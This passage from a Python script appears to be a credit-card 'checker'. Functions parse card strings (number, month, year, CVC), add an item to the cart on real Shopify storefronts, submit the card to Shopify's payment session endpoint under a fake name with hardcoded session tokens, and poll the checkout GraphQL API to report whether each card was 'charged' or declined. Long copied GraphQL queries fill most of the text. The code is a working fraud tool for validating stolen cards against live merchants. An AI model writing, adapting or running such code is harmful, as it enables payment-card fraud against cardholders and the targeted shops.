paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}','variables': {'receiptId': 'gid://shopify/ProcessedReceipt/1505710342338','sessionToken': 'MTk3c2EzTWhpb1lyeWtnaFA5QlhDc29nTjRKUzNxeEJqMkZ3QkNjVnRVT0kvVk1Gcm84ckV0VXBJTzVaY2hHaHRXak5kWWY0NGxnYW4xS2U4dE9NNmM5dkplNE1ISnd0Q29aZ1IyTWNTU2cvTURPc00yVWNUaGhoS21WQzBmRzZOOW9IZE85RHBTU3ZmR1dRVC9SWFBPVHg5MnRjMElWUDhlV1M0aVRyeHpCdzM2NTk1MkhZMkRlSEIvZ25jWm42VDZJQ0d6eitsVkxneVZQTk9GbWpQdm95bVV5LzBnb1U2cW5uYWVidG9oeHBFRktxYUl6S1RuVTJ0cVNjSjdiVnU2aUFwSjhxNTdpNVlQZUpzdCs1U2FYTmxqblN1NUtLVjVJaS0tRGh3aktjMi9yZ2V6dHdiMC0tOHV3MXExUVY4Z1hoTk5qT21URDR1dz09',},'operationName': 'PollForReceipt',}
	response = r.post('https://wiredministries.com/checkouts/unstable/graphql', params=params, cookies=r.cookies, headers=headers, json=json_data)
	
	msg=response.text		    			   
	match=re.search(r'"code":"(.*?)"', msg)
	if match:
		mssgg = match.group(1)		
		return mssgg
	else:
		return 'charged'	

def Tele3(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()	
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'application/javascript',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryNElqs53N46kvafdd',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/collections/golf/products/aar-golf-tee-bag-ball-marker',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}
	files = {
    'form_type': (None, 'product'), 
    'id': (None, '43174029852823'),
    'quantity': (None, '1'),
    'product-id': (None, '8027808956567'),
    'section-id': (None, 'template--17846771941527__main'),
    'sections_url': (None, '/collections/golf/products/aar-golf-tee-bag-ball-marker'),
    'sections': (None, 'cart-icon-bubble,sections--17846771548311__cart-drawer'),
}
	response = r.post('https://allamericanroughneck.com/cart/add', cookies=r.cookies, headers=headers, files=files)
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/collections/golf/products/aar-golf-tee-bag-ball-marker',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	data = {
    'updates[]': '1',
    'note': '',
    'checkout': '',
}
	response = r.post('https://allamericanroughneck.com/cart', cookies=r.cookies, headers=headers, data=data)
	headers = {
    'authority': 'checkout.pci.shopifyinc.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.pci.shopifyinc.com',
    'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
	json_data = {
    'credit_card': {
        'number': n,
        'month': mm,
        'year': yy,
        'verification_value': cvc,
        'start_month': None,
        'start_year': None,
        'issue_number': '',
        'name': 'Jhon Cena Tera daddy',
    },
    'payment_session_scope': 'allamericanroughneck.com',
}
	iddd = requests.post('https://deposit.shopifycs.com/sessions', headers=headers, json=json_data).json()['id']
	print(iddd)
	headers = {
    'authority': 'allamericanroughneck.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/json',    
    'origin': 'https://allamericanroughneck.com',
    'referer': 'https://allamericanroughneck.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'shopify-checkout-client': 'checkout-web/1.0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-checkout-one-session-token': 'eFdNVVBZZ1pLZUt5akJwT1FGc0ZtM1hXMVFWTkNGbHRKdG4vd3Y4ZEIyWFlyUXk3aWJQTkRWYmt1b2QzWk9aRTN5SDk2VFF4MGJHREZmMzhiZHNXMXgzM2Fibnl0ZFdLNmg5T09aaFVDSi9SZ0lVcVpuVmRwWHlRQ1AycVJwMTZVZGNCSHN3WXhjc2FSZERxQ2tEMmNvS2MwclloUGY1NkZxNENxYUQ1RzVib2lCRlVXTkxjYno0OTdRRHNjaWlidGJNQzk0TmdNRm96dWVzNFV5VGtBcWNub0hMak4ySU9yd3RuUXN6ekxqMmlGamQySHg2dkE0L1BacXZCc0VqOGRjSGgxZng4d1BqY1hRcnAvRUd4V255aDZZNXZrRFVlOTZ0dkkwTHE5UzFVdzZmRVQxTE5IKzQ9LS15ZE5xT1NHTTVrcnVMNnBiLS0yYWg3ZGRtSCtKdTdldW9sdVFSUkx3PT0',
    'x-checkout-web-build-id': iddd,
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
    'x-checkout-web-source-id': 'Z2NwLWFzaWEtc291dGhlYXN0MTowMUpRTlBENDNCVzhXOUE3WFFRSlhQWEVRNw',
}
	params = {
    'operationName': 'PollForReceipt',
}
	
	json_data = {
    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value 